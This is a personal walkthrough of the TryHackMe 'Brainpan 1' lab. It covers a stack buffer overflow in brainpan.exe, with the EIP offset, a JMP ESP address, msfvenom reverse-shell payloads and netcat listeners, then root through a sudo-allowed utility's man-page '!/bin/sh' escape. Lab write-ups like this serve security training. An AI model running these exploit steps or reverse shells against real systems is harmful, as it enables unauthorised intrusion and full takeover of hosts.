# Brainpan 1 [TryHackMe]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.64.4
```

Let's perform an `nmap` scan and check for open ports:

```
nmap -p- -Pn $targ3t -oN nmap.scan -vv
```

There are two open ports:

```
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
```

On port `9999` we have the following prompt:

```
nc $targ3t 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          >>
```

And port `10000` expects an `HTTP/0.9` request as input:

```
nc $targ3t 10000
GET /
print
<html>
<body bgcolor="ffffff">
<center>
<!-- infographic from http://www.veracode.com/blog/2012/03/safe-coding-and-software-security-infographic/ -->
<img src="soss-infographic-final.png">
</center>
</body>
</html>
```

<sub>_`print` is not really a command or request of any kind, just the first thing I thought of trying._</sub> 

Looks like port `10000` is hosting a web page. Let's put it through `feroxbuster`:

```
feroxbuster -u http://$targ3t:10000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

It's found a path `/bin`. Let's see it:

```
firefox $targ3t:10000/bin
```

Look what we have here:

```
Directory listing for /bin/

    brainpan.exe 

```

Let's download the file and load it into a Windows VM. Now that we have it operational on the VM, let's borrow a couple of scripts from the [Gatekeeper](../thm_gatekeeper/README.md) room:

```
cp ../thm_gatekeeper/exploit.py .
cp ../thm_gatekeeper/bytearray.py .
```

First, let's try to generate a cyclic pattern of 200 bytes and copy it into the port `9999` prompt:

```
┌──(kali㉿kali)-[~/Workspace/thm_brainpan1]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

┌──(kali㉿kali)-[~/Workspace/thm_brainpan1]
└─$ nc 192.168.0.111 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          >> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
^C

┌──(kali㉿kali)-[~/Workspace/thm_brainpan1]
└─$ /usr/bin/msf-pattern_offset -q 35724134
[*] Exact match at offset 524
```

So we got our offset at `524`, which means we can now append this to `exploit.py` along with `retn` with 4 `B`s to see if we control EIP:

```python3
...
port = 9999  # Target Port

offset = 524
overflow = "A" * offset
retn = "B"*4
...
```

And it worked:

```
EIP     42424242
```

Now let's find the bad chars using `ERC.Xdbg` plugin in `x32dbg`:

```
ERC --config SetWorkingDirectory C:\Users\windows\Desktop\brainpan1
ERC --bytearray -bytes "\x00"
```

Let's generate the exact same byte array locally and include it in the `exploit.py`:

```
python3 bytearray.py "\x00"
```

```python3
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""
```

Now when we execute the `exploit.py` we need to run the following command via `ERC.Xdbg`:

```
ERC --Compare 005FF910 C:\Users\windows\Desktop\brainpan1\ByteArray_1.bin
```

Looks like there are no bad chars. Good. Now let's find the jump points using `ERC.Xdbg`:

```
ERC --SearchMemory FF E4
```

Let's use this one:

```
311712F3
```

add it to `retn` variable in reversed format:

```python3
...
retn = '\xf3\x12\x17\x31'
...
```

Now let's generate a payload with `msfvenom` and copy it to the `payload` variable in `exploit.py`:

```
msfvenom -p 'windows/shell_reverse_tcp' LHOST=192.168.0.109 LPORT=9822 -b "\x00" -f c
```

And also let's add 10 NOP values to both `padding` and `postfix` values:

```python3
padding = '\x90'*10
payload = ("\xdd\xc2\xd9\x74\x24\xf4\x58\xba\xd9\xfa\xc7\x99\x31\xc9"
...
"\xbd")
postfix = '\x90'*10
```

Start a `netcat` listener locally:

```
nc -lvnp 9822
```

And launch the exploit:

```
nc -lvnp 9822
listening on [any] 9822 ...
connect to [192.168.0.109] from (UNKNOWN) [192.168.0.111] 50002
Microsoft Windows [Version 10.0.22621.4890]
(c) Microsoft Corporation. All rights reserved.

C:\Users\windows\Desktop\brainpan1>whoami
whoami
desktop-n9ia851\windows

C:\Users\windows\Desktop\brainpan1>
```

We got the shell, now let's replicate this for the actual TryHackMe machine:

```
└─$ nc -lvnp 9822
listening on [any] 9822 ...
connect to [10.14.99.123] from (UNKNOWN) [10.10.64.4] 57584
CMD Version 1.4.1

Z:\home\puck>
```

Let's try to find how to escalate privileges: 

```
Z:\>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\

  3/4/2013  12:02 PM  <DIR>         bin
  3/4/2013  10:19 AM  <DIR>         boot
  3/1/2025  10:54 AM  <DIR>         etc
  3/4/2013  10:49 AM  <DIR>         home
  3/4/2013  10:18 AM    15,084,717  initrd.img
  3/4/2013  10:18 AM    15,084,717  initrd.img.old
  3/4/2013  12:04 PM  <DIR>         lib
  3/4/2013   9:12 AM  <DIR>         lost+found
  3/4/2013   9:12 AM  <DIR>         media
 10/9/2012   8:59 AM  <DIR>         mnt
  3/4/2013   9:13 AM  <DIR>         opt
  3/7/2013  10:07 PM  <DIR>         root
  3/1/2025  10:54 AM  <DIR>         run
  3/4/2013  10:20 AM  <DIR>         sbin
 6/11/2012   8:43 AM  <DIR>         selinux
  3/4/2013   9:13 AM  <DIR>         srv
  3/1/2025  12:10 PM  <DIR>         tmp
  3/4/2013   9:13 AM  <DIR>         usr
  8/5/2019   2:47 PM  <DIR>         var
 2/25/2013   1:32 PM     5,180,432  vmlinuz
 2/25/2013   1:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,847,613,440 bytes free
```

Strangely, this seems to be a linux machine. Let's generate a proper shellcode for this machine and run the exploit once again:

```
msfvenom -p 'linux/x86/shell_reverse_tcp' LHOST=10.14.99.123 LPORT=9822 -b "\x00" -f c
```

This time we got a suboptimal shell, but it's a linux shell:

```
nc -lvnp 9822
listening on [any] 9822 ...
connect to [10.14.99.123] from (UNKNOWN) [10.10.64.4] 57585
whoami
puck
```

Let's improve it:

```
python -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ ls
ls
checksrv.sh  web
puck@brainpan:/home/puck$
```

Checking for sudo permissions, something interesting comes up:

```
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

If we check what this biary does:

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

It seems like `gtfobins` manpages shell escape sequence could help us here:

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_uti manual man
...
 Manual page man(1) line 1 (press h for help or q to quit)!/bin/sh
!/bin/sh
# whoami
whoami
root
#
```

And we're root!
